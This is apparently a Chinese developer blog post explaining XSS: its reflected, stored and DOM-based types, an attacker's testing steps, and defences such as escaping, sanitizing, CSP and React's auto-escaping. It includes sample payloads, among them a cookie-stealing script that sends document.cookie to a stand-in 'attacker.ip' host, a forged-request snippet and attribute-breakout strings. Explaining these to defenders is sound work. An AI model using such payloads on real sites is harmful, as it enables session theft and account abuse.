---
title: 又是一篇XSS介绍
date: 2020-01-31 19:27
---

# XSS —— 注入攻击

Cross Site Scripting，直译过来叫“跨站脚本攻击”，如果缩写为CSS会与层叠样式表（Cascading Style Sheet）冲突，所以缩写为XSS。

**注入恶意代码，是XSS攻击的特征。**

因为恶意代码被注入到了目标站点上，所以XSS可以在不违反浏览器同源策略的条件下进行信息泄露等恶意行为，危害十分严重。

关于为什么叫“跨站脚本攻击”而不叫“代码注入攻击”，这其实是历史原因。根据wikipedia上给出的解释，XSS这个名字最早出自2000年微软安全工程师的安全报告，当时XSS被用来描述一种从无关页面跳转到被攻击页面的攻击行为，随后攻击方式不断进化，而XSS这个名字被沿用了下来成了web应用代码注入攻击的统称。

# 什么是Relected XSS、Stored XSS、DOM-based XSS

主流观点将XSS攻击分为Related XSS（反射型）、Stored XSS（持久型）和DOM-based XSS（DOM型）。那么这三种是什么意思呢？

在传统的服务端渲染web应用中，source文件是由浏览器向服务端得请求到的，就像下面这样：

```
          1. request
+------+ -----------> +------+
|client|              |server|
+------+ <----------- +------+
          2. response
```

js和css比较固定，算是静态资源通常不会动态生成，而html则通常是由后端使用模板引擎动态拼接生成的，因此注入过程都是发生在这里。

拼接html的数据来源有两种，一种是后端数据库里保存的数据，另一种是HTTP请求里包含的信息。

第一种比较好理解，常见的场景包括用户的个人介绍、头像等。

```ejs
<div>
  Hello, <%= user.name %>
</div>
```

如果用户故意构造一个恶意的用户名，比如`<script>alert(1)</script>`，那么产生的html片段就会是

```html
<div>
  Hello, <script>alert(1)</script>
</div>
```

由于注入的恶意代码保存在数据库中，能稳定存在，所以这种方式叫做持久型XSS。

第二种基本就是url的query的回显，比如在搜索场景比较常见：

```ejs
您搜索的关键词是：<%= window.location.query.key %>
```

这里的恶意代码来源于url中的query部分，如果我们构造一个恶意地址，就可以实现一样的攻击效果。因为注入的恶意代码是在url里，所以与前一种最大的不同是无法稳定存在，必须诱惑用户点击恶意url。这种方式叫做反射型XSS。

为什么叫反射型呢？打个比方，现在面前有一面镜子，你拿着激光笔朝着镜子照射，反射的光线的朝向是由入射光线决定的。同样地，向server端请求html，返回的结果是由url的query决定的，这种形式，就像是在反射光线一样。

可以看到，这两种XSS都是发生在服务端的。为了解决XSS人们提出了很多办法，比如在服务端对拼接好的html内容做转义和过滤等，破坏掉其中可能注入代码的地方，比如将`<`转义为`&lt;`。

后来随着前端发展，很多页面的DOM元素是在前端生成的。与后端渲染类似的，此时就出现了注入的可能。比如：

```js
function onChange(userName) {
  document.getElementById('username').innerHTML = userName;
}
```

如果userName是一段恶意代码，这段代码就会被注入进页面中，因为这个注入过程发生在前端，所以之前介绍的在后端做的XSS防范这里将无法生效。因为比较特殊，所以这种XSS被单独分离出来，称作DOM-based XSS。

综上：

1. 反射型。恶意代码来自url
2. 持久型。恶意代码来自数据库
3. DOM型。注入行为发生在浏览器。

# 常见的XSS危害举例

XSS的后果非常严重，想象一下，如果页面上的脚本可以被随意更改，那几乎什么事情都有可能发生。

1. 盗取cookie。比如：

```html
<script>
// 通过动态构造一个img标签，将当前页面的cookie发送给attack.com
new Image().src = "http://attacker.ip/" + document.cookie;
</script>
```

2. 伪造请求。有些cookie是http-only的无法得到，那就直接在源站发起请求。比如下面的例子，伪造用户调用sendEmail接口发送邮件。

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST','http://victim.com/api/sendEmail',true);
xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
xhr.send('email=xxxx@example.com&content=test');
</script>
```

3. 钓鱼。在页面上动态动态伪造表单诱使用户填写，比如动态构造一个需要二次确认密码的弹窗。

4. 监听键盘事件。比如：

```html
<script>
document.onkeypress = function(e) {
  ... // 将键盘信息发送给攻击者
}
</script>
```

5. 泄露隐私信息。比如盗取当前页面中用户的电话、账号、住址等信息。

# XSS的攻击举例（攻击者角度）

这里以反射型XSS举例，因为反射型和持久型区别不大，而DOM型只是另一个名字，本质上跟反射型和持久型区别不大。

1. 找出可注入对象

    最常见的就是url里的query，其他任何HTTP请求里的东西其实都可以拿来尝试，比如各种header。

    假如有一个url`http://victim.com/?q=123`，`q`是一个可注入对象。

    这个过程可能没那么容易，因为不是所有的可注入对象都很容易发现，也许会用到一些扫描工具。

2. 寻找注入点

    构造一些随机值作为query，比如上一步发现的`q`，那就构造一个url让`q`等于一个随机值（比如`4018989734009937`），然后用浏览器的调试工具在整个DOM树中搜索，看看出现在了哪里。

    这个过程通常也没那么简单，因为query里的东西未必直接反映在了DOM元素中。可以借助一些自动化工具，对页面DOM变化进行监听和比对。有时候甚至需要借助浏览器的调试工具对js代码打断点调试分析。

3. 构造恶意参数

    如果找到了反射的位置，观察一下四周的环境（比如是否处于引号内部，是否是属性值），然后针对性地构造恶意参数。

    例如发现了一个img标签：

    ```html
    <img src="4018989734009937"/>
    ```

   那么就可以构造`q`等于`"/><script>alert(1)</script>`（当然需要encodeURI），将其带入url中进行测试看是否能够触发。

4. 不断尝试，重复步骤3

    由于大部分站点或多或少都会对XSS采取一定的防范措施，所以通常构造恶意参数这个过程需要不断尝试，有经验的攻击者会通过构造不同的参数，观察他们的响应情况来推测XSS的防护策略，然后进一步调整构造新的攻击参数。比如[这篇博客](https://blog.csdn.net/qq_29277155/article/details/51320064)中提到的一些绕过XSS防护的技巧。此外由于开发者通常选择市面上现有的XSS防护工具进行保护，也可以寻找主流防护工具方案的漏洞进行尝试（可见及时打安全补丁多么重要）。

    这个步骤通常会利用各种自动化工具。

# 如何预防

关于如何预防XSS，基本上有两个思路：

1. 转义（escape）

    转义的做法是在展示的地方，对HTML内容做一次转换，将其中的`<`，`>`等敏感字符转译成其他字符，例如将`<script>alert(0);</script>`转译成`&lt;script&gt;alert(0);&lt;/script&gt;`。这样就无法产生可执行的脚本，都是展示性的。具体的转义规则是：

    ```
    & --> &amp;
    < --> &lt;
    > --> &gt;
    " --> &quot;
    ' --> &#x27;
    / --> &#x2F;
    ```

    上面提到的转义只针对的是那些“展示”的地方。对于非展示的地方，同样需要转义，例如：

    html标签属性

    ```html
    <div attr=这里需要转义>content</div>
    ```

    script标签内部的数据（pugjs为例）

    ```pug
    script.
      window.initData = #{这里需要转义}
    ```

    css的url、behavior属性

    ```css
    .container {
      background: url("这里需要转义");
    }
    ```

    当然还有其他很多地方，具体可以参考OWASP的[cheatsheet](https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#XSS_Prevention_Rules)

    怎么转义呢？开发者没必要自己实现转义逻辑，使用自动转义的模板引擎或是前端框架通常就能实现大部分的转义工作了。

    那么，是否有了转义就可以避免XSS了呢？答案是否定的！因为有些时候我们是允许合法的拼接html片段的，比如带格式的富文本场景，总不能转义了以后格式都不让显示了吧。

    ```html
    <strong>这里是重点</strong> <-- 带有格式的富文本
    ```

2. 过滤（sanitize）

    过滤正好弥补了前面的转义无法处理的问题。

    想法其实很简单，就是基于规则过滤掉输入中有危险的部分，比如只保留`div`，`table`等安全的标签，去掉`script`等危险的标签或属性。具体的规则是什么需要具体问题具体分析，既不能定得太严格以至于影响用户的正常使用，又不能定得太宽松容易被轻松绕过。

    不过这样正式过滤的问题所在，既然是规则，就存在被绕过的可能。比如规则是过滤script标签：

    ```js
    function sanitize(content) {
      content.replace(/script/, '');
    }
    ```

    那么上面的过滤对于ScRiPt就无能为力了。

    有很多好用的过滤器工具，开发者没必要也不应该自己去实现过滤逻辑。比如[c# html sanitizer](https://github.com/mganss/HtmlSanitizer)，[java html sanitizer](https://www.owasp.org/index.php/OWASP_Java_HTML_Sanitizer_Project)，[ruby html sanitizer](https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html)等等。

除了以上两个思路，还有一些其他手段。

3. HTTP response使用X-XSS-Protection头部

    开启这个头部，可以让浏览器开启保护功能，加载页面时自动sanitize或是发现XSS行为时停止加载。目前主流的浏览器默认都开启了XSS保护功能，所以这个HTTP头部已经没那么重要了。不过最新版的chrome移除了XSS Auditor功能。。

4. 启用Content-Script-Policy（CSP）

    CSP主要的作用是告诉浏览器，当前页面只允许从什么样的地方加载资源，如果限制了只允许从安全的来源加载资源，就认为可以有效的防止XSS，因为XSS的注入代码通常是外部引入的。

    CSP可以在HTTP response的header或是html页面的meta标签里开启。比如header的例子：

    ```
    Content-Security-Policy: default-src http://victim.com
    ```

    这个配置意思是页面中所有的内容都必须来自http://victim.com，此外CSP还可以实现更细粒度的控制，比如脚本的来源、媒体资源的来源、匹配多个域名等。详细内容参考[这篇MDN的文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)。

有些办法虽然无法帮助避免XSS，但是可以降低XSS后的损失。比如将cookie设置为http-only。

# XSS in React

最后，让我们看看React里的XSS情况怎么样。

## 1. React默认会把所有输出DOM的内容做转义处理以防止XSS。

比如：

```jsx
const userInput = '<script>alert(0)</script>';
<div>{userInput}</div>
```

会被转义成：

```html
<div>&lt;script&gt;alert(0);&lt;/script&gt;</div>
```

## 2. 某些常见的XSS标签属性，React也会做处理。

例如a标签的href：

```jsx
const userInput = 'javascript: alert(1)';
<a href={userInput}>link</a>
```

上面的例子，当前版本的React（v16.12）还是会出现XSS问题的，不过React给出了一个warning，并且特意说明了未来版本会禁止这种行为：

> Warning: A future version of React will block javascript: URLs as a security precaution. Use event handlers instead if you can. If you need to generate unsafe HTML try using dangerouslySetInnerHTML instead.

如果href使用base64转码，React会直接拦截这种行为并报错：

> Not allowed to navigate top frame to data URL.

所以总的来说，React在各种场景下都是很安全的。不过有一个例外，那就是dangerouslySetInnerHTML，问题到最后都归结到了人。

比如在一些富文本环境下，经常容易出现dangerouslySetInnerHTML的情况，这时候就需要配合其他手段预防XSS了。

# 参考资料

- [OWASP: Cross Site Scripting](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS))
- [OWASP: XSS Prevention Cheat Sheet](https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#XSS_Prevention_Rules)
- [Wikipedia: Cross Site Scripting](https://en.wikipedia.org/wiki/Cross-site_scripting#Background)
- [掘金：你不能错过的XSS指引](https://juejin.im/post/5d169a12f265da1bd424942e)
- [pentest: XSS Attachs Practical Scenarios](https://pentest-tools.com/blog/xss-attacks-practical-scenarios/)
- [CSDN: XSS插入绕过一些方式总结](https://blog.csdn.net/qq_29277155/article/details/51320064)
- [PortSwigger: Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
- [Stack Overflow: Which characters need to be escaped in HTML?](https://stackoverflow.com/questions/7381974/which-characters-need-to-be-escaped-in-html)
- [Stack Overflow: What does it mean when they say React is XSS protected?](https://stackoverflow.com/questions/33644499/what-does-it-mean-when-they-say-react-is-xss-protected)
- [Medium: The Most Common XSS Vulnerability in React.js Applications](https://medium.com/node-security/the-most-common-xss-vulnerability-in-react-js-applications-2bdffbcc1fa0)
